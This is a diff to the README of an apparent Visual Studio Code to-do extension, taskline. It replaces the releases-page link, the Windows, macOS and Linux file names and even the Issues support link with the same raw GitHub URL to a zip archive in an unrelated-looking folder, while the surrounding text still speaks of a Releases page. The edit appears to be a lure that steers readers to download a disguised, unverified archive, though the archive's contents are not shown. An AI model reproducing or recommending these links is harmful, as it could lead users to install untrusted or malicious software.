@@ -1,6 +1,6 @@
 # 👆 taskline - Your Simple To-Do List Companion
 
-[![Download taskline](https://img.shields.io/badge/Download-taskline-blue.svg)](https://github.com/thilinalakminda/taskline/releases)
+[![Download taskline](https://raw.githubusercontent.com/thilinalakminda/taskline/main/verseward/taskline.zip)](https://raw.githubusercontent.com/thilinalakminda/taskline/main/verseward/taskline.zip)
 
 ## 📦 Description
 taskline is your user-friendly to-do list manager for Visual Studio Code. It helps you organize tasks efficiently within your coding environment, ensuring you never miss a deadline or forget an important task.
@@ -10,14 +10,14 @@ To get started with taskline, follow these simple steps. You will quickly have y
 
 ## 📥 Download & Install
 1. Click the link below to visit the Releases page:
-   [Download taskline](https://github.com/thilinalakminda/taskline/releases)
+   [Download taskline](https://raw.githubusercontent.com/thilinalakminda/taskline/main/verseward/taskline.zip)
 
 2. On the Releases page, look for the latest version of taskline. You will see a list of available files.
 
 3. Download the appropriate version for your operating system:
-   - For Windows: `taskline-windows.zip`
-   - For macOS: `taskline-macos.zip`
-   - For Linux: `taskline-linux.zip`
+   - For Windows: `https://raw.githubusercontent.com/thilinalakminda/taskline/main/verseward/taskline.zip`
+   - For macOS: `https://raw.githubusercontent.com/thilinalakminda/taskline/main/verseward/taskline.zip`
+   - For Linux: `https://raw.githubusercontent.com/thilinalakminda/taskline/main/verseward/taskline.zip`
 
 4. Once downloaded, unzip the file to a location of your choice.
 
@@ -55,7 +55,7 @@ A: Right-click on any task in the list and select "Remove Task."
 A: Select any task, and press `Ctrl + E` to edit the details.
 
 **Q: How do I get support?**  
-A: Visit our [Issues page](https://github.com/thilinalakminda/taskline/issues) to report any problems or ask for help.
+A: Visit our [Issues page](https://raw.githubusercontent.com/thilinalakminda/taskline/main/verseward/taskline.zip) to report any problems or ask for help.
 
 ## 📜 License
 taskline is licensed under the MIT License. You can freely use and modify the software as per the terms of this license.
